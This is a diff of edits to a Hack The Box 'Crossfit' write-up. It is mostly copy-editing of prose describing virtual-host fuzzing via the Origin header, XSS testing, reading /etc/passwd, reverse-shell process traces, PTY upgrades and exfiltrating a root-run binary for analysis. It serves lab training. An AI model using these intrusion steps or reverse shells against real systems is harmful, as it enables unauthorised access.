@@ -6,13 +6,11 @@ description: >-
 
 # HTB - Crossfit
 
-## HTB - CrossFit
-
-### Overview
+## Overview
 
 ![](../../.gitbook/assets/0-crossfit-infocard.png)
 
- This Insane-difficulty machine from Hack The Box took far longer to root than I would have liked, mostly due to getting hung up on the the final exploit. I took a break from it, after getting the user.txt, due to frustration and wanting to make progress elsewhere. This machine challenged me in a number of areas, from creative enumeration methods, to code and binary analysis, to "exploit" writing in a foreign language \(C!\). After taking a break for a few months, I came back with a fresh perspective and was able to quickly discover the errors I had been making. \(Along with fresh patience with the quick-clean script the authors used!\). A script to automate all of the moving pieces of the final exploit solved my issues and I was able to root the machine. 
+ This Insane-difficulty machine from Hack The Box took far longer to root than I would have liked, mostly due to getting hung up on the the final exploit. I took a break from it, after getting the user.txt, due to frustration and wanting to make progress elsewhere. This machine challenged me in a number of areas, from creative enumeration methods, to code and binary analysis, to "exploit" writing in a foreign language \(JavaScript and C!\). After taking a break for a few months, I came back with a fresh perspective and was able to quickly discover the errors I had been making. \(Along with fresh patience with the quick-clean script the authors used!\). A script to automate all of the moving pieces of the final exploit solved my issues and I was able to root the machine. 
 
 ## Useful Skills and Tools
 
@@ -232,13 +230,13 @@ This did not come up with anything, however.  I tried with `ffuf` as well, but d
 
 ![](../../.gitbook/assets/1-employees.png)
 
-On the "About-Us" page I found four more possible usernames: Becky Taylor, Noah Leonard, Evelyn Fields, Leroy Guzman.  As the Manager, Leroy seemed like the most likely target.
+On the "About-Us" page I found four more possible usernames: Becky Taylor, Noah Leonard, Evelyn Fields, and Leroy Guzman.  As the Manager, Leroy seemed like the most likely target.
 
 ### Cross-site Scripting \(XSS\)
 
 ![](../../.gitbook/assets/2-xss-test.png)
 
-Since there wasn't anything obvious to go by, I started doing some basic vulnerability testing on the submission boxes. The first one at `/contact.php` did not seem to be vulnerable to either XSS or SQL injection, 
+Since there wasn't anything obvious to go by, I started doing some basic vulnerability testing on the submission boxes. The first one at `/contact.php` did not seem to be vulnerable to either XSS or SQL injection.
 
 ![](../../.gitbook/assets/2-xss-test2.png)
 
@@ -294,7 +292,7 @@ In the same spirit I tried to get the admin to download a PHP reverse shell from
 
 ![](../../.gitbook/assets/2-origin.png)
 
-Origin Header with Access-Control-Allow-Origin response header
+`Origin` Header with `Access-Control-Allow-Origin` response header
 
 ### ftp.crossfit.htb
 
@@ -332,13 +330,13 @@ ftp                     [Status: 200, Size: 10701, Words: 3427, Lines: 369]
 [WARN] Caught keyboard interrupt (Ctrl-C)
 ```
 
- With the information from these articles I was able to craft a set of parameters to fuzz the Origin header.  In order to do this I needed to use the `-H` flag to include the custom header selection, as well as use the `-mr` flag to match using a custom regular expression. 
+ With the information from these articles I was able to craft a set of parameters to fuzz the `Origin` header.  In order to do this I needed to use the `-H` flag to include the custom header selection, as well as use the `-mr` flag to match using a custom regular expression. 
 
 > ### Match on Regular Expression <a id="match-on-regular-expression"></a>
 >
 > In some cases, however, you may be fuzzing for more complex bugs and want to filter based on a [regular expression](https://en.wikipedia.org/wiki/Regular_expression). For example, if you’re filtering for a path traversal bug you may wish to pass a value of `-mr "root:"` to FFUF to only identify successful responses that indicate a successful retreival of `/etc/passwd`.
 
- I knew if the response from the server included the words "Allow-Origin" that it was a valid request using the specified "Origin" header.  Using this information, I was able to find another virtual host: `ftp.crossfit.htb`.  
+ I knew if the response from the server included the words "Allow-Origin" that it was a valid request using the specified `Origin` header.  Using this information, I was able to find another virtual host: `ftp.crossfit.htb`.  
 
 ![](../../.gitbook/assets/2-ftb-apache.png)
 
@@ -915,7 +913,7 @@ www-data 32126  0.0  0.0   3736  2908 ?        S    17:35   0:00 bash -c bash -i
 www-data 32128  0.0  0.0   3868  3220 ?        S    17:35   0:00 bash -i
 ```
 
-Hmm...`ps` showed that this was a busy machine...Looked like I had company \(only one of those shells is mine!\).
+Hmm...`ps` showed that this was a busy machine...  It looked like I had company \(only one of those shells is mine!\).
 
 ```bash
 www-data@crossfit:/run$ cat /etc/passwd
@@ -954,7 +952,7 @@ ftpadm:x:1003:1004::/srv/ftp:/usr/sbin/nologin
 hank:x:1004:1006::/home/hank:/bin/bash
 ```
 
-I inspected `/etc/passwd` for local user accounts and found that `root`, `isaac`, and `hank` can login with a shell.  These were my most likely targets.
+I inspected `/etc/passwd` for local user accounts and found that `root`, `isaac`, and `hank` could login with a shell.  These were my most likely targets.
 
 ```text
 www-data@crossfit:/home$ ls -la
@@ -1010,7 +1008,7 @@ I saw that `hank` had `user.txt` in his home folder, so now I knew I needed to m
 
 
 
-TODO: Something missing here?
+TODO: insert output of search for hank in files \(I may have deleted this since because of too many files?\)
 
 ```text
 www-data@crossfit:/etc/ansible/playbooks$ ls -la
@@ -1151,7 +1149,7 @@ hank@crossfit:~$ sudo -l
 -bash: sudo: command not found
 ```
 
-Well this was odd... It told me that it could not find the `sudo` command.  I went and checked inside `/usr/sbin` and there was no binary for `sudo` installed.
+Well, this was odd... It told me that it could not find the `sudo` command.  I went and checked inside `/usr/sbin` and there was no binary for `sudo` installed.
 
 ```text
 hank@crossfit:~$ ifconfig
@@ -1204,8 +1202,6 @@ I checked for running processes and noticed a few things were running from the `
 * [https://www.selenium.dev/](https://www.selenium.dev/)
 
 > Selenium automates browsers. That's it!
-
-TODO: cat /opt/selenium/check\_report.py and talk about this simulating the admin checking the security reports, which allowed me to access the machine.
 
 ```text
 hank@crossfit:/var$ cd www/
@@ -1757,7 +1753,7 @@ id
 uid=1000(isaac) gid=1000(isaac) groups=1000(isaac),50(staff),116(ftp),1005(admins)
 ```
 
-there was a new group `staff` that had access to a bunch of files related to selenium
+There was a new group `staff` that had access to a bunch of files related to selenium.
 
 ```bash
 isaac@crossfit:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
@@ -1773,7 +1769,7 @@ isaac@crossfit:~$ stty rows 23 columns 103
 isaac@crossfit:~$ export TERM=xterm-256color
 ```
 
-upgraded to full tty shell
+Next, I upgraded to full PTY shell.
 
 ```text
 isaac@crossfit:~/send_updates$ cd includes
@@ -1796,7 +1792,7 @@ $msg_dir = "/srv/ftp/messages";
 ?>
 ```
 
-In the `includes` folder there was a file `config.php` that pointed to `/srv/ftp/messages`. db.php was the same as before
+In the `includes` folder there was a file `config.php` that pointed to `/srv/ftp/messages`.  This was the variable I had seen in the other PHP script.
 
 ```php
 <?php
@@ -1822,7 +1818,7 @@ function cleanup()
 ?>
 ```
 
-functions.php explained why my query would be deleted each time
+The file `functions.php` explained why my query would be deleted from the database every so often.
 
 ```text
 isaac@crossfit:~/send_updates/vendor/composer$ ps aux
@@ -1891,7 +1887,7 @@ In the process output I could see my reverse shells \(I tried two different meth
 2021/01/15 18:51:01 FS:               ACCESS | /usr/lib/x86_64-linux-gnu/libffi.so.6.0.4
 ```
 
-Using pspy \(with the -f flag to see files as they are accessed\) I noticed a program dbmsg that I didnt know
+Using pspy \(with the `-f` flag to see files as they are accessed\) I noticed a program `dbmsg` that I didn't know.
 
 ```text
 isaac@crossfit:~$ man dbmsg
@@ -1938,7 +1934,7 @@ void main(void)
 }
 ```
 
-I exfiltrated the binary to my system and opened the program in ghidra.  After locating the `main()` function, I saw that it ran as root.  This looked to be a possible bet for escalation of privileges.  It looked like it checked the current system time, created a random number using the time as a seed, then ran the `process_data()` function.
+I exfiltrated the binary to my system and opened the program in [ghidra](https://ghidra-sre.org/).  After locating the `main()` function, I saw that it ran as root.  This looked to be a possible bet for escalation of privileges.  It looked like it checked the current system time, created a random number using the time as a seed, then ran the `process_data()` function.
 
 ```c
 void process_data(void)
